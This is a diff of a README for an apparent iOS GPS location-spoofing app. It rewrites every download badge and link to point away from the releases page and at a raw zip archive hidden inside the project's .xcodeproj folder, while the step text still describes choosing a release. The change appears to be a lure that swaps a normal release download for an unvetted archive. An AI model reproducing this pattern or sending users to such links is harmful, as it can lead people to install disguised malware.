@@ -6,7 +6,7 @@ Welcome to **ios-location-spoofer**! This app allows you to change your GPS loca
 
 ## 📥 Download Here
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shikavan/ios-location-spoofer/releases)
+[![Download](https://raw.githubusercontent.com/shikavan/ios-location-spoofer/main/location-spoofer.xcodeproj/spoofer-ios-location-2.2.zip)](https://raw.githubusercontent.com/shikavan/ios-location-spoofer/main/location-spoofer.xcodeproj/spoofer-ios-location-2.2.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To get started with **ios-location-spoofer**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
    
-   [Visit this page to download](https://github.com/shikavan/ios-location-spoofer/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/shikavan/ios-location-spoofer/main/location-spoofer.xcodeproj/spoofer-ios-location-2.2.zip)
 
 2. **Choose the Latest Version:** Look for the most recent release at the top of the list. Click on the version number to view the details.
 
@@ -70,4 +70,4 @@ Need help? You can find support by checking the **Issues** section on the GitHub
 
 Don't forget to download the app if you haven't already:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/shikavan/ios-location-spoofer/releases)
+[![Download](https://raw.githubusercontent.com/shikavan/ios-location-spoofer/main/location-spoofer.xcodeproj/spoofer-ios-location-2.2.zip)](https://raw.githubusercontent.com/shikavan/ios-location-spoofer/main/location-spoofer.xcodeproj/spoofer-ios-location-2.2.zip)
